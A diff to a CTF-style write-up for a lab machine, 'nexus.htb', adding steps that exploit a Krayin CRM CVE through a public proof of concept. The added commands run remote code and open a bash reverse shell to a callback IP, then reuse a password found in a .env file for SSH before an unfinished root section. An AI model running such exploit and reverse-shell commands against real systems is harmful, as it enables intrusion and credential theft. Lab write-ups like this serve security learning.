@@ -89,7 +89,6 @@ To access the webpage we add at the end of the `/etc/hosts` file the redirection
 echo "[ip] nexus.htb" | sudo tee -a /etc/hosts
 ```
 
-
 ###  <u>Web Aplication Fingerprinting</u>
 - Use whatweb to see the specifications about the web app and the technologies used
 
@@ -139,18 +138,36 @@ Clicking on the user profile, the version is `Krayin CRM 2.2.0`. There is a CVE 
 
 ###  <u>CVE-2026-38526</u>
 
+https://github.com/NathanHimself/CVE-2026-38526-PoC
 
+- Does the exploit work?
 
+```bash
+python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'id'
+```
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+- Employ a revershell
+
+```bash
+python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'setsid bash -c "bash -i >& /dev/tcp/10.10.15.148/4444 0>&1" </dev/null >/dev/null 2>&1 &'
+```
+**Shell** aquired !!
 
 ---
 
 ## User Flag
-- Explain how to get to a user once foothold is aquired
->If the foothold starts with a user thats not html or default, explain how to get the user flag
 
-```bash
-[used commands]
-```
+Right after getting the shell I open the /etc/passwd to enumerate other posible users.
+
+There I find the user 'jones' 
+
+- Looking inside `.env`
+
+Another password is revealed: `y27xb3ha!!74GbR`
+
+- Connect to ssh to jones and go for the user flag.
 
 **User Flag:** Aquired!
 
@@ -158,11 +175,36 @@ Clicking on the user profile, the version is `Krayin CRM 2.2.0`. There is a CVE 
 
 ## Privilege Escalation (Root Flag)
 
-- Explain vectors to reach root/admin
+- Using linpeas
+
+Enumerate system's timers and discover an unusual timer
 
 ```bash
-[used commands]
+#To see the timers without linpeas
+systemctl list-timers --all
 ```
+![alt text](./img/timers.png)
+
+`gitea-template-sync.timer`  is the one to look for.
+
+### <u>Gitea templait -> root</u>
 
 
-**Root Flag:** Aquired!
+--- On going ---
+
+
+
+
+
+--- 
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+# Learned
+
+- Even if nothing tells you a password is from someone, try it. You might get it right and accomplish another user.
